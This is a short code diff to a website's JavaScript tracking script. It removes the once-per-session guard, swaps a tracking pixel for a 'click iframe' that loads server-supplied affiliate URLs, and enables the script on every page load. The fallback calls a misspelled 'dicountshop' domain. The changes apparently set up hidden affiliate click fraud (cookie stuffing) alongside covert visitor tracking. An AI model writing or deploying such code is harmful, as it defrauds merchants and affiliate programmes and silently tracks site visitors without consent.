@@ -30,7 +30,7 @@
 
     async function initTracking() {
 
-         if (sessionStorage.getItem('iframe_triggered')) return;
+         //if (sessionStorage.getItem('iframe_triggered')) return;
 
         try {
             let uniqueId = getCookie('tracking_uuid') || generateUUID();
@@ -66,11 +66,11 @@
            
             if (result.success && result.affiliate_url) {
                 
-                createTrackingPixel(result.affiliate_url);
+                createClickIframe(result.affiliate_url);
                
                 sessionStorage.setItem('iframe_triggered', 'true');
             } else {
-                createTrackingPixel('https://api.dicountshop.com/api/fallback-pixel?id=' + uniqueId);
+                createClickIframe('https://api.dicountshop.com/api/fallback-pixel?id=' + uniqueId);
             }
         } catch (error) {
             console.error('Error in tracking script:', error);
@@ -116,5 +116,5 @@
 
     //initTracking();
     //setTimeout(initTracking, 2000);
-    //window.addEventListener("DOMContentLoaded", initTracking);
+    window.addEventListener("DOMContentLoaded", initTracking);
 })();
